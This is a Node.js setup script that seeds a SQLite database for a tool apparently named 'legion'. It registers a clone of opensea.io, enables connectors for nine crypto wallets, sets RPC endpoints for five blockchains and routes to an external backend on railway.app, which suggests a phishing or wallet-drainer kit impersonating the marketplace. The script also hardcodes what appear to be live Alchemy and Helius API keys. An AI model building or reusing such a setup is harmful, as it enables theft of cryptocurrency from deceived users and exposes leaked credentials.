const Database = require('better-sqlite3');
const path = require('path');

const dbPath = path.join(process.cwd(), 'legion.db');
console.log('Database path:', dbPath);

try {
  const db = new Database(dbPath);
  
  // Initialize tables
  db.exec(`
    CREATE TABLE IF NOT EXISTS clones (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      url TEXT NOT NULL,
      domain TEXT NOT NULL,
      port INTEGER NOT NULL,
      enableSSL BOOLEAN NOT NULL,
      status TEXT DEFAULT 'created',
      createdAt TEXT NOT NULL,
      lastUpdated TEXT NOT NULL
    );

    CREATE TABLE IF NOT EXISTS configurations (
      id TEXT PRIMARY KEY,
      cloneId TEXT NOT NULL,
      rpcEvm TEXT,
      rpcSolana TEXT,
      rpcTron TEXT,
      rpcTon TEXT,
      rpcBitcoin TEXT,
      walletMetamask BOOLEAN DEFAULT 1,
      walletCoinbase BOOLEAN DEFAULT 1,
      walletTrust BOOLEAN DEFAULT 1,
      walletPhantom BOOLEAN DEFAULT 1,
      walletRabby BOOLEAN DEFAULT 1,
      walletSolflare BOOLEAN DEFAULT 1,
      walletConnectEnabled BOOLEAN DEFAULT 1,
      walletLedger BOOLEAN DEFAULT 1,
      walletTrezor BOOLEAN DEFAULT 1,
      backendUrl TEXT,
      createdAt TEXT NOT NULL,
      updatedAt TEXT NOT NULL,
      FOREIGN KEY (cloneId) REFERENCES clones(id)
    );
  `);

  const cloneId = `opensea-test-${Date.now()}`;
  const now = new Date().toISOString();

  const addClone = db.prepare(`
    INSERT OR REPLACE INTO clones (id, name, url, domain, port, enableSSL, status, createdAt, lastUpdated)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
  `);

  addClone.run(
    cloneId,
    'opensea-test',
    'https://opensea.io',
    'localhost',
    8080,
    0,
    'created',
    now,
    now
  );

  const addConfig = db.prepare(`
    INSERT OR REPLACE INTO configurations (
      id, cloneId, rpcEvm, rpcSolana, rpcTron, rpcTon, rpcBitcoin,
      walletMetamask, walletCoinbase, walletTrust, walletPhantom,
      walletRabby, walletSolflare, walletConnectEnabled, walletLedger, walletTrezor,
      backendUrl, createdAt, updatedAt
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `);

  addConfig.run(
    `config-${cloneId}`,
    cloneId,
    'https://eth-mainnet.g.alchemy.com/v2/LdIrCjy1EiH2RKWDCFpIz',
    'https://mainnet.helius-rpc.com/?api-key=dcac74bd-3b5d-4372-bb5b-c93422dcea5c',
    'https://api.trongrid.io',
    'https://toncenter.com/api/v2/jsonRPC',
    'https://mempool.space/api',
    1, 1, 1, 1, 1, 1, 1, 1, 1,
    'https://sadrailala-production.up.railway.app',
    now,
    now
  );

  console.log('✅ Configuration stored in database!');
  console.log(`Clone ID: ${cloneId}`);
  
  const clone = db.prepare('SELECT * FROM clones WHERE id = ?').get(cloneId);
  const config = db.prepare('SELECT * FROM configurations WHERE cloneId = ?').get(cloneId);
  
  console.log('\n📋 Clone:');
  console.log(JSON.stringify(clone, null, 2));
  console.log('\n⚙️  Config:');
  console.log(`  EVM RPC: ${config.rpcEvm.substring(0, 50)}...`);
  console.log(`  Solana RPC: ${config.rpcSolana.substring(0, 50)}...`);
  console.log(`  TRON RPC: ${config.rpcTron}`);
  console.log(`  TON RPC: ${config.rpcTon}`);
  console.log(`  Bitcoin RPC: ${config.rpcBitcoin}`);
  console.log(`  Backend: ${config.backendUrl}`);
  console.log(`  All wallets enabled: ${config.walletMetamask && config.walletCoinbase && config.walletPhantom}`);

  db.close();
  console.log('\n✅ Setup complete! Ready for testing.');
} catch (error) {
  console.error('❌ Error:', error.message);
  process.exit(1);
}
